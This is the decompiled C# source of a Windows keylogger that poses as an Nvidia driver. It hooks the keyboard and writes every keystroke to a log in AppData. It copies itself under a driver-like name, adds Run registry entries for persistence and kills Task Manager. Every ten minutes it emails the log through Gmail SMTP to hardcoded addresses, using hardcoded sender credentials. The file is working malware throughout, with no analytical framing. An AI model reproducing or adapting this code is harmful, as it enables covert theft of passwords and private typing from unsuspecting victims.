using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Text;
using System.Timers;
using System.Windows.Forms;
using Microsoft.Win32;

namespace project;

internal class Program
{
	private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

	private const int WH_KEYBOARD_LL = 13;

	private const int WM_KEYDOWN = 256;

	private static LowLevelKeyboardProc _proc = HookCallback;

	private static IntPtr _hookID = IntPtr.Zero;

	public static string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "nvidia.log");

	public static byte caps = 0;

	public static byte shift = 0;

	public static byte failed = 0;

	public static byte counter = 0;

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool UnhookWindowsHookEx(IntPtr hhk);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

	[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr GetModuleHandle(string lpModuleName);

	public static void Main()
	{
		if (failed == 0)
		{
			File.WriteAllText(path, "");
		}
		_hookID = SetHook(_proc);
		startup();
		Timer timer = new Timer();
		timer.Elapsed += OnTimedEvent;
		timer.AutoReset = true;
		timer.Interval = 600000.0;
		timer.Start();
		Application.Run();
		GC.KeepAlive(timer);
		UnhookWindowsHookEx(_hookID);
	}

	public static void startup()
	{
		string text = Application.get_ExecutablePath().ToString();
		string text2 = text;
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		folderPath = Path.Combine(folderPath, "nvdisp.exe");
		try
		{
			File.Copy(text, folderPath, overwrite: false);
			text = folderPath;
		}
		catch
		{
		}
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			if (registryKey.GetValue("Nvidia driver") == null)
			{
				registryKey.SetValue("Nvidia driver", folderPath);
			}
			registryKey.Close();
		}
		catch
		{
		}
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			if (registryKey.GetValue("Nvidia driver") == null)
			{
				registryKey.SetValue("Nvidia driver", text);
			}
			registryKey.Close();
		}
		catch
		{
		}
		if (text != text2)
		{
			Process.Start(text);
			Environment.Exit(0);
		}
	}

	public static void OnTimedEvent(object sender, EventArgs e)
	{
		Process[] processes = Process.GetProcesses();
		Process[] array = processes;
		foreach (Process process in array)
		{
			if (process.MainWindowTitle.Contains("Taskmgr.exe"))
			{
				process.Kill();
			}
		}
		counter++;
		Mail("chaachasaab@hotmail.com", "imran.nazir11003@gmail.com", "pakistan00");
		Mail("shah_sahab_jhoolalal@hotmail.co.uk", "imran.nazir11004@gmail.com", "pakistan00");
	}

	public static void Mail(string x, string y, string z)
	{
		MailMessage mailMessage = new MailMessage();
		mailMessage.To.Add(x);
		mailMessage.From = new MailAddress(y);
		mailMessage.Subject = Environment.MachineName + "--" + counter + "--" + Environment.UserName;
		mailMessage.SubjectEncoding = Encoding.UTF8;
		if (counter == 0)
		{
			mailMessage.Body = "Welcome 2 Pan Yaki...." + Environment.MachineName + "----" + Environment.UserName + "---- is online";
		}
		else
		{
			mailMessage.Body = "Welcome 2 Pan Yaki....";
		}
		mailMessage.BodyEncoding = Encoding.UTF8;
		mailMessage.IsBodyHtml = false;
		mailMessage.Priority = MailPriority.Normal;
		SmtpClient smtpClient = new SmtpClient();
		smtpClient.Credentials = new NetworkCredential(y, z);
		smtpClient.Port = 587;
		smtpClient.Host = "smtp.gmail.com";
		smtpClient.EnableSsl = true;
		Attachment attachment = new Attachment(path);
		if (counter != 0)
		{
			mailMessage.Attachments.Add(attachment);
		}
		try
		{
			smtpClient.Send(mailMessage);
		}
		catch
		{
			attachment.Dispose();
		}
		attachment.Dispose();
	}

	private static IntPtr SetHook(LowLevelKeyboardProc proc)
	{
		using Process process = Process.GetCurrentProcess();
		using ProcessModule processModule = process.MainModule;
		return SetWindowsHookEx(13, proc, GetModuleHandle(processModule.ModuleName), 0u);
	}

	private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
	{
		//IL_0036: Unknown result type (might be due to invalid IL or missing references)
		//IL_003b: Invalid comparison between I4 and Unknown
		//IL_0049: Unknown result type (might be due to invalid IL or missing references)
		//IL_004b: Unknown result type (might be due to invalid IL or missing references)
		//IL_004f: Invalid comparison between Unknown and I4
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Unknown result type (might be due to invalid IL or missing references)
		//IL_00fa: Expected I4, but got Unknown
		//IL_00fa: Unknown result type (might be due to invalid IL or missing references)
		//IL_00fe: Unknown result type (might be due to invalid IL or missing references)
		//IL_0110: Expected I4, but got Unknown
		//IL_0110: Unknown result type (might be due to invalid IL or missing references)
		//IL_0114: Unknown result type (might be due to invalid IL or missing references)
		//IL_014a: Expected I4, but got Unknown
		//IL_04d4: Unknown result type (might be due to invalid IL or missing references)
		//IL_04db: Unknown result type (might be due to invalid IL or missing references)
		//IL_0565: Expected I4, but got Unknown
		//IL_0565: Unknown result type (might be due to invalid IL or missing references)
		//IL_056c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0582: Expected I4, but got Unknown
		//IL_0582: Unknown result type (might be due to invalid IL or missing references)
		//IL_0589: Invalid comparison between Unknown and I4
		StreamWriter streamWriter;
		int num;
		if (nCode >= 0 && wParam == (IntPtr)256)
		{
			streamWriter = File.AppendText(path);
			num = Marshal.ReadInt32(lParam);
			if (65536 == (int)Control.get_ModifierKeys())
			{
				shift = 1;
			}
			Keys val = (Keys)num;
			if ((int)val <= 123)
			{
				switch (val - 19)
				{
				case 0:
					goto IL_020f;
				case 1:
					goto IL_021f;
				case 8:
					goto IL_0242;
				case 14:
					goto IL_0252;
				case 15:
					goto IL_0262;
				case 16:
					goto IL_0272;
				case 17:
					goto IL_0282;
				case 18:
					goto IL_0292;
				case 19:
					goto IL_02a2;
				case 20:
					goto IL_02b2;
				case 21:
					goto IL_02c2;
				case 23:
					goto IL_02d2;
				case 25:
					goto IL_02e2;
				case 26:
					goto IL_02f2;
				case 27:
					goto IL_0302;
				case 29:
					goto IL_0312;
				case 30:
					goto IL_033f;
				case 31:
					goto IL_036c;
				case 32:
					goto IL_0399;
				case 33:
					goto IL_03c6;
				case 34:
					goto IL_03f3;
				case 35:
					goto IL_0420;
				case 36:
					goto IL_044d;
				case 37:
					goto IL_047a;
				case 38:
					goto IL_04a7;
				case 2:
				case 3:
				case 4:
				case 5:
				case 6:
				case 7:
				case 9:
				case 10:
				case 11:
				case 12:
				case 13:
				case 22:
				case 24:
				case 28:
					goto IL_06b4;
				}
				switch (val - 91)
				{
				case 0:
				case 1:
				case 2:
					goto IL_0634;
				}
				switch (val - 112)
				{
				case 0:
					break;
				case 1:
					goto IL_015f;
				case 2:
					goto IL_016f;
				case 3:
					goto IL_017f;
				case 4:
					goto IL_018f;
				case 5:
					goto IL_019f;
				case 6:
					goto IL_01af;
				case 7:
					goto IL_01bf;
				case 8:
					goto IL_01cf;
				case 9:
					goto IL_01df;
				case 10:
					goto IL_01ef;
				case 11:
					goto IL_01ff;
				default:
					goto IL_06b4;
				}
				streamWriter.Write("[f.1]");
			}
			else
			{
				switch (val - 160)
				{
				case 0:
				case 1:
				case 2:
				case 3:
				case 4:
				case 5:
					goto IL_0634;
				case 13:
					goto IL_0644;
				case 14:
					goto IL_0654;
				case 15:
					goto IL_0664;
				case 16:
					goto IL_0674;
				case 17:
					goto IL_0684;
				case 18:
					goto IL_0694;
				case 19:
					goto IL_06a4;
				case 6:
				case 7:
				case 8:
				case 9:
				case 10:
				case 11:
				case 12:
				case 20:
				case 21:
				case 22:
				case 23:
				case 24:
				case 25:
					goto IL_06b4;
				case 26:
					goto IL_0772;
				case 27:
					goto IL_079f;
				case 28:
					goto IL_07cc;
				case 29:
					goto IL_07f9;
				case 30:
					goto IL_0823;
				case 31:
					goto IL_084a;
				case 32:
					goto IL_0871;
				}
				switch (val - 219)
				{
				case 0:
					goto IL_05a0;
				case 1:
					goto IL_05cd;
				case 2:
					goto IL_05dd;
				case 3:
					goto IL_060a;
				}
				if ((int)val != 262144)
				{
					goto IL_06b4;
				}
				streamWriter.Write("[alt]");
			}
			goto IL_0896;
		}
		goto IL_08a2;
		IL_01bf:
		streamWriter.Write("[f.8]");
		goto IL_0896;
		IL_01af:
		streamWriter.Write("[f.7]");
		goto IL_0896;
		IL_018f:
		streamWriter.Write("[f.5]");
		goto IL_0896;
		IL_019f:
		streamWriter.Write("[f.6]");
		goto IL_0896;
		IL_017f:
		streamWriter.Write("[f.4]");
		goto IL_0896;
		IL_04a7:
		if (shift == 0)
		{
			streamWriter.Write("9");
		}
		else
		{
			streamWriter.Write("(");
		}
		goto IL_0896;
		IL_0871:
		if (shift == 0)
		{
			streamWriter.Write("`");
		}
		else
		{
			streamWriter.Write("~");
		}
		goto IL_0896;
		IL_0664:
		streamWriter.Write("[vol_up]");
		goto IL_0896;
		IL_047a:
		if (shift == 0)
		{
			streamWriter.Write("8");
		}
		else
		{
			streamWriter.Write("*");
		}
		goto IL_0896;
		IL_0654:
		streamWriter.Write("[vol_down]");
		goto IL_0896;
		IL_084a:
		if (shift == 0)
		{
			streamWriter.Write("/");
		}
		else
		{
			streamWriter.Write("?");
		}
		goto IL_0896;
		IL_044d:
		if (shift == 0)
		{
			streamWriter.Write("7");
		}
		else
		{
			streamWriter.Write("&");
		}
		goto IL_0896;
		IL_05dd:
		if (shift == 0)
		{
			streamWriter.Write("]");
		}
		else
		{
			streamWriter.Write("}");
		}
		goto IL_0896;
		IL_0644:
		streamWriter.Write("[vol_mute]");
		goto IL_0896;
		IL_0420:
		if (shift == 0)
		{
			streamWriter.Write("6");
		}
		else
		{
			streamWriter.Write("^");
		}
		goto IL_0896;
		IL_0823:
		if (shift == 0)
		{
			streamWriter.Write(".");
		}
		else
		{
			streamWriter.Write(">");
		}
		goto IL_0896;
		IL_0634:
		streamWriter.Write("");
		goto IL_0896;
		IL_03f3:
		if (shift == 0)
		{
			streamWriter.Write("5");
		}
		else
		{
			streamWriter.Write("%");
		}
		goto IL_0896;
		IL_05cd:
		streamWriter.Write("|");
		goto IL_0896;
		IL_07f9:
		if (shift == 0)
		{
			streamWriter.Write("-");
		}
		else
		{
			streamWriter.Write("_");
		}
		goto IL_0896;
		IL_03c6:
		if (shift == 0)
		{
			streamWriter.Write("4");
		}
		else
		{
			streamWriter.Write("$");
		}
		goto IL_0896;
		IL_05a0:
		if (shift == 0)
		{
			streamWriter.Write("[");
		}
		else
		{
			streamWriter.Write("{");
		}
		goto IL_0896;
		IL_0694:
		streamWriter.Write("[media_stop]");
		goto IL_0896;
		IL_0399:
		if (shift == 0)
		{
			streamWriter.Write("3");
		}
		else
		{
			streamWriter.Write("#");
		}
		goto IL_0896;
		IL_07cc:
		if (shift == 0)
		{
			streamWriter.Write(",");
		}
		else
		{
			streamWriter.Write("<");
		}
		goto IL_0896;
		IL_060a:
		if (shift == 0)
		{
			streamWriter.Write("'");
		}
		else
		{
			streamWriter.Write('"');
		}
		goto IL_0896;
		IL_036c:
		if (shift == 0)
		{
			streamWriter.Write("2");
		}
		else
		{
			streamWriter.Write("@");
		}
		goto IL_0896;
		IL_0684:
		streamWriter.Write("[media_prev]");
		goto IL_0896;
		IL_079f:
		if (shift == 0)
		{
			streamWriter.Write("=");
		}
		else
		{
			streamWriter.Write("+");
		}
		goto IL_0896;
		IL_033f:
		if (shift == 0)
		{
			streamWriter.Write("1");
		}
		else
		{
			streamWriter.Write("!");
		}
		goto IL_0896;
		IL_06b4:
		if (shift == 0 && caps == 0)
		{
			streamWriter.Write(((object)(Keys)num).ToString()!.ToLower());
		}
		if (shift == 1 && caps == 0)
		{
			streamWriter.Write(((object)(Keys)num).ToString()!.ToUpper());
		}
		if (shift == 0 && caps == 1)
		{
			streamWriter.Write(((object)(Keys)num).ToString()!.ToUpper());
		}
		if (shift == 1 && caps == 1)
		{
			streamWriter.Write(((object)(Keys)num).ToString()!.ToLower());
		}
		goto IL_0896;
		IL_0896:
		shift = 0;
		streamWriter.Close();
		goto IL_08a2;
		IL_0312:
		if (shift == 0)
		{
			streamWriter.Write("0");
		}
		else
		{
			streamWriter.Write(")");
		}
		goto IL_0896;
		IL_0772:
		if (shift == 0)
		{
			streamWriter.Write(";");
		}
		else
		{
			streamWriter.Write(":");
		}
		goto IL_0896;
		IL_08a2:
		return CallNextHookEx(_hookID, nCode, wParam, lParam);
		IL_0302:
		streamWriter.Write("[dl]");
		goto IL_0896;
		IL_02f2:
		streamWriter.Write("[insert]");
		goto IL_0896;
		IL_02e2:
		streamWriter.Write("[prnt_scrn]");
		goto IL_0896;
		IL_02d2:
		streamWriter.Write("[print]");
		goto IL_0896;
		IL_02c2:
		streamWriter.Write("[dwn]");
		goto IL_0896;
		IL_02b2:
		streamWriter.Write("[rgt]");
		goto IL_0896;
		IL_02a2:
		streamWriter.Write("[up]");
		goto IL_0896;
		IL_0292:
		streamWriter.Write("[lft]");
		goto IL_0896;
		IL_0282:
		streamWriter.Write("[home]");
		goto IL_0896;
		IL_0272:
		streamWriter.Write("[end]");
		goto IL_0896;
		IL_0262:
		streamWriter.Write("[p_down]");
		goto IL_0896;
		IL_0252:
		streamWriter.Write("[p_up]");
		goto IL_0896;
		IL_0242:
		streamWriter.Write("[esc]");
		goto IL_0896;
		IL_021f:
		if (caps == 0)
		{
			caps = 1;
		}
		else
		{
			caps = 0;
		}
		goto IL_0896;
		IL_0674:
		streamWriter.Write("[media_next]");
		goto IL_0896;
		IL_06a4:
		streamWriter.Write("[media_play/pause]");
		goto IL_0896;
		IL_020f:
		streamWriter.Write("[pause]");
		goto IL_0896;
		IL_015f:
		streamWriter.Write("[f.2]");
		goto IL_0896;
		IL_016f:
		streamWriter.Write("[f.3]");
		goto IL_0896;
		IL_01ff:
		streamWriter.Write("[f.12]");
		goto IL_0896;
		IL_01ef:
		streamWriter.Write("[f.11]");
		goto IL_0896;
		IL_01df:
		streamWriter.Write("[f.10]");
		goto IL_0896;
		IL_01cf:
		streamWriter.Write("[f.9]");
		goto IL_0896;
	}
}
